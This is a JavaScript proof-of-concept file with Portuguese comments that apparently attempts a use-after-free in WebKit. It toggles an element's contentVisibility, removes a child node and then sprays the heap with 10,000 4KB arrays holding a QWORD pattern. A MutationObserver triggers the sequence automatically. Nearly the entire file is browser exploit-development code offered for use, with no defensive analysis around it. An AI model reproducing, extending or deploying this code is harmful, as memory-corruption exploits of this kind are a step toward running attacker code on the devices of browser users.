// js/uaf_webkit_poc/poc.js
import { debug_log } from './module/utils.mjs';

let uafCoreLogicHasRun = false; // Flag para controlar a execução da lógica principal

function heapSpray() {
  let spray = [];
  const sprayIterations = 10000; // Mantendo 10000, já que não houve OOM com o padrão anterior
  
  // NOVO: Pulverizar com o valor 1 (como um QWORD little-endian)
  const sprayPatternQWORD = [0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]; 
  
  debug_log(`Iniciando heapSpray com ${sprayIterations} iterações e padrão QWORD [0x01]...`);

  for (let i = 0; i < sprayIterations; i++) {
    let arr = new Uint8Array(0x1000); // 4KB
    for (let j = 0; j < arr.length; j++) {
      arr[j] = sprayPatternQWORD[j % sprayPatternQWORD.length]; // Aplica o padrão QWORD
    }
    spray.push(arr);
  }
  return spray;
}

export function triggerUAF() {
  const currentContainer = document.querySelector(".container");

  if (!currentContainer) {
    debug_log("Erro Crítico: Elemento .container não encontrado para UAF.");
    console.error("Erro Crítico: Elemento .container não encontrado para UAF.");
    return;
  }

  if (uafCoreLogicHasRun && document.getElementById('runUAFBtn') && document.getElementById('runUAFBtn').disabled) {
    debug_log("UAF já foi tentado (botão desabilitado). Para um novo teste completo, recarregue a página.");
    return;
  }

  const currentChild = currentContainer.querySelector(".child");

  debug_log("Iniciando tentativa de UAF: contentVisibility=hidden...");
  currentContainer.style.contentVisibility = "hidden";

  if (currentChild) {
    debug_log("Elemento .child encontrado, removendo-o.");
    currentChild.remove();
  } else {
    debug_log("Elemento .child já foi removido ou não encontrado inicialmente.");
  }

  uafCoreLogicHasRun = true; 
  const uafButton = document.getElementById('runUAFBtn');
  if(uafButton) {
      uafButton.disabled = true;
      debug_log("Botão de UAF desabilitado. Recarregue a página para um novo teste completo.");
  }

  setTimeout(() => {
    debug_log("Continuando UAF: contentVisibility=auto, heapSpray()...");
    if (document.body.contains(currentContainer)) {
        currentContainer.style.contentVisibility = "auto";
    } else {
        debug_log("Container foi removido do DOM antes de contentVisibility='auto'.");
        return;
    }
    
    let sprayArrays = heapSpray(); 
    if(sprayArrays.length > 0) {
        debug_log(`Heap spray realizado com ${sprayArrays.length} arrays (padrão QWORD [0x01]).`);
    }
    debug_log("Tentativa de UAF (principal) concluída. Verifique o console e comportamento do navegador.");

    // Opcional: Adicionar mais interações com currentContainer aqui (Sugestão 3)
    // if (document.body.contains(currentContainer)) {
    //     debug_log("Forçando re-layout/re-paint do container...");
    //     currentContainer.style.display = 'none';
    //     void currentContainer.offsetHeight; 
    //     currentContainer.style.display = 'block';
    //     let tempChild = document.createElement('div');
    //     tempChild.textContent = "test";
    //     try {
    //       currentContainer.appendChild(tempChild);
    //       currentContainer.removeChild(tempChild);
    //     } catch(e) { debug_log("Erro em manipulações adicionais: " + e.message); }
    //     debug_log("Manipulações adicionais do container concluídas.");
    // }

  }, 0);
}

// Configuração do MutationObserver
const initialContainerForObserver = document.querySelector(".container");
if (initialContainerForObserver) {
    const observer = new MutationObserver((mutationsList, obs) => {
      if (!uafCoreLogicHasRun) { 
        debug_log("MutationObserver: DOM tree modified, chamando triggerUAF (primeira vez via observer)...");
        triggerUAF(); // A flag uafCoreLogicHasRun e o disable do botão dentro de triggerUAF controlarão a re-execução.
        obs.disconnect(); 
        debug_log("MutationObserver desconectado.");
      } else {
        obs.disconnect(); 
      }
    });
    observer.observe(initialContainerForObserver, { childList: true, subtree: true });
} else {
    console.warn("Elemento .container inicial não encontrado para MutationObserver no UAF PoC.");
}
